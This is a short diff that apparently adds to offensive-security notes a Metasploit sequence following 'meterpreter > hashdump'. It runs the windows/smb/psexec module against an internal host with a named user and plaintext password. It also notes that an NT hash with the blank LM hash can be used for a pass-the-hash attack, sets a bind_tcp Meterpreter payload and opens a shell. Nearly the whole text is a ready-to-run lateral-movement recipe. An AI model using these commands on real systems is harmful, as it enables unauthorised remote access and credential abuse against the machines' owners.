@@ -1,2 +1,12 @@
 
 meterpreter > hashdump
+
+use exploit/windows/smb/psexec
+set RHOST 10.2.0.3
+set SMBUser jarrieta
+set SMBPass nastyCutt3r  
+# NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack.
+# NOTE2: Require the full NT hash, you may need to add the "blank" LM (aad3b435b51404eeaad3b435b51404ee)
+set PAYLOAD windows/meterpreter/bind_tcp
+run
+shell
